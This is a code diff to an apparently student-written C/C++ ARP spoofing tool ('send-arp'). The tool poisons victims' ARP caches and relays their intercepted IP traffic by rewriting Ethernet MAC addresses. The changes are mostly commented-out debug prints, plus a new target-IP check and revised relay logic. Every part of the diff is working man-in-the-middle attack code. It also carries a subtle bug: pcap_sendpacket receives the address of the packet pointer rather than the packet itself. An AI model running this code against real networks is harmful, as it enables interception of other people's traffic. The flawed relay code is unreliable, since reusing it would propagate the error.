@@ -46,8 +46,8 @@ AddrInfo getMyIPMacAddr(char *ifname)
 	returnAddrInfo._ip = Ip(inet_ntoa(sin->sin_addr));
 	close(sockfd);
 
-  	printf("IP : %s\n", inet_ntoa(sin->sin_addr));
-	printf("MAC "MAC_ADDR_FMT"\n", MAC_ADDR_FMT_ARGS(mac_addr));
+  	// printf("IP : %s\n", inet_ntoa(sin->sin_addr));
+	// printf("MAC "MAC_ADDR_FMT"\n", MAC_ADDR_FMT_ARGS(mac_addr));
 
 	return returnAddrInfo;
 }
@@ -76,8 +76,6 @@ struct IPHeader{
 
 //////////////
 
-
-// // 이하로는 직접 구현한 함수 목록
 
 void usage() {
 	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
@@ -128,8 +126,8 @@ Mac getSMac(Mac smac, Mac dmac, Ip sip, Mac tmac, Ip tip, pcap_t *handle) {
 
 		in_addr temp;
 		temp.s_addr = (_ethArpPacket->arp_.sip_);
-		printf("IP : %s\n", inet_ntoa(temp));
-		printf("MAC "MAC_ADDR_FMT"\n", MAC_ADDR_FMT_ARGS(_smacCheck->sourceMAC));
+		// printf("IP : %s\n", inet_ntoa(temp));
+		// printf("MAC "MAC_ADDR_FMT"\n", MAC_ADDR_FMT_ARGS(_smacCheck->sourceMAC));
 
 		// Return Smac
 		return _ethArpPacket->eth_.smac_;
@@ -187,8 +185,9 @@ AddrInfoPair checkReceivedPacket(const u_char* packet, AddrInfo AttackerInfo, st
 		if(flag) {
 			isValidDmac = receivedPacket->eth_.dmac_ == AttackerInfo._mac ? 1 : 0;
 			isValidSmac = receivedPacket->eth_.smac_ == addr._sender._mac ? 1 : 0;
+			isValidTip  = receivedPacket->arp_.tip_  == addr._target._ip  ? 1 : 0;
 			
-			if(isValidDmac && isValidSmac) {
+			if(isValidDmac && isValidSmac && isValidTip) {
 				// printf("Check Packet Detected.\n");
 				return addr;
 			}
@@ -198,7 +197,7 @@ AddrInfoPair checkReceivedPacket(const u_char* packet, AddrInfo AttackerInfo, st
 
 		// Reply의 경우
 		isValidDmac = receivedPacket->eth_.dmac_ == AttackerInfo._mac 
-					   || receivedPacket->eth_.dmac_ == Mac("FF:FF:FF:FF:FF:FF")? 1 : 0;
+				   || receivedPacket->eth_.dmac_ == Mac("FF:FF:FF:FF:FF:FF")? 1 : 0;
 		isValidSmac = receivedPacket->eth_.smac_ == addr._sender._mac ? 1 : 0;
 		isValidTip = Ip(ntohl(receivedPacket->arp_.tip_)) == addr._target._ip ? 1 : 0;
 		
@@ -234,32 +233,42 @@ int isArpPacket(const u_char* packet) {
 
 void relayReceivedPacket(const u_char* packet, u_long size, AddrInfo AttackerInfo, AddrInfoPair relayNeededPair, pcap_t *handle) {
 
-	u_char * relayPacket = (u_char *)packet;
+	// u_char * relayPacket = (u_char *)malloc(size);
 
-	printf("Is Attacker's Mac addr ? : %s\n", AttackerInfo._mac == Mac("00:0C:29:C0:78:87") ? "Yes" : "No");
-	printf("Is Target's Mac addr ? : %s\n", relayNeededPair._target._mac == Mac("08:5D:DD:BA:7E:1C") ? "Yes" : "No");
+	// memcpy(relayPacket, packet, size);
 
+	// printf("Is Attacker's Mac addr ? : %s\n", AttackerInfo._mac == Mac("00:0C:29:C0:78:87") ? "Yes" : "No");
+	// printf("Is Target's Mac addr ? : %s\n", relayNeededPair._target._mac == Mac("08:5D:DD:BA:7E:1C") ? "Yes" : "No");
+
+	// return;
+
+	EthHdr *relayEthHdr = (EthHdr *)packet;
 
 	// Mac 정보 수정.
-	((EthHdr *)relayPacket)->smac_ = Mac("70:9c:d1:40:ba:be");
-	((EthHdr *)relayPacket)->dmac_ = AttackerInfo._mac;
+	relayEthHdr->smac_ = AttackerInfo._mac;
+	relayEthHdr->dmac_ = relayNeededPair._target._mac;
+
+	// printf("SMAC "MAC_ADDR_FMT"\n", MAC_ADDR_FMT_ARGS(((EthernetHeader *)packet)->sourceMAC));
+	// printf("DMAC "MAC_ADDR_FMT"\n", MAC_ADDR_FMT_ARGS(((EthernetHeader *)packet)->destinationMAC));
 
 	// For Debug
-	printf("size : %lu\n", size);
-	EthArpPacket * checkPacket = (EthArpPacket *)packet;
-	printf("Check SMac address :: %s\n", checkPacket->eth_.smac_ == AttackerInfo._mac ? "Same" : "Different");
-	printf("Check DMac address :: %s\n", checkPacket->eth_.dmac_ == relayNeededPair._target._mac ? "Same" : "Different");
+	// printf("size : %lu\n", size);
+	// EthArpPacket * checkPacket = (EthArpPacket *)relayPacket;
+	// printf("Check SMac address :: %s\n", checkPacket->eth_.smac_ == AttackerInfo._mac ? "Same" : "Different");
+	// printf("Check DMac address :: %s\n", checkPacket->eth_.dmac_ == relayNeededPair._target._mac ? "Same" : "Different");
 
 	EthernetHeader * _tempEth = (EthernetHeader *)packet;
+	
+	if(ntohs(_tempEth->type) != 0x0800) {
+		return;
+	}
 
-	if(size != 74 || ntohs(_tempEth->type) != 0x0800) return;
 
 	IPHeader * temp = (IPHeader *)(packet + ETHERNET_HEADER_SIZE);
-
-	printf(":: Reply Packet Info :: \n");
-	printf("Protocol : %d\n", ntohs(temp->protocolID));
-	printf("Source IP : %s\n", inet_ntoa(temp->sourceIP));
-	printf("Destination IP : %s\n", inet_ntoa(temp->destinationIP));
+	// printf(":: Relay Packet Info :: \n");
+	// printf("Protocol : %d\n", ntohs(temp->protocolID));
+	// printf("Source IP : %s\n", inet_ntoa(temp->sourceIP));
+	// printf("Destination IP : %s\n", inet_ntoa(temp->destinationIP));
 
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), size);
 	if (res != 0) {
@@ -270,7 +279,7 @@ void relayReceivedPacket(const u_char* packet, u_long size, AddrInfo AttackerInf
 
 	printf("Sent!\n");
 
-
+	// free(relayPacket);
 	// if(temp->protocolID != 0x01) return;
 	
 	// int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&relayPacket), size);
@@ -338,11 +347,7 @@ void replyOrRelay(AddrInfo AttackerInfo, std::vector<AddrInfoPair>& SenderTarget
 
 		// ARP check
 		if(!isArpPacket(packet)) {
-			// Relay를 해야하는 case
-			// 이때, 해당 패킷이 Sender가 보낸 패킷인지를 확인해야함. (아니면 모든 패킷에 대해 다루기 때문.)
 			AddrInfoPair relayNeededPair = checkReceivedPacket(packet, AttackerInfo, SenderTargetList, FOR_RELAY);
-
-			// Mac 정보를 알맞게 변경해서, pcap_sendpack 호출.
 			if(isValidAddrInfoPair(relayNeededPair)){
 				printf("valid :: Relay packet\n");
 				relayReceivedPacket(packet, header->caplen, AttackerInfo, relayNeededPair, handle);
@@ -351,10 +356,7 @@ void replyOrRelay(AddrInfo AttackerInfo, std::vector<AddrInfoPair>& SenderTarget
 			continue;
 		}
 		
-		// check 시 반환값이 NULL 아니면 Reply용 함수를 호출
 		AddrInfoPair replyNeededPair = checkReceivedPacket(packet, AttackerInfo, SenderTargetList, FOR_REPLY);
-
-		// 찾았는지 검증 후, reply 패킷 전송.
 		if(isValidAddrInfoPair(replyNeededPair)) {
 			printf("valid :: Reply packet\n");
 			replyARPPacket(AttackerInfo, replyNeededPair, handle);
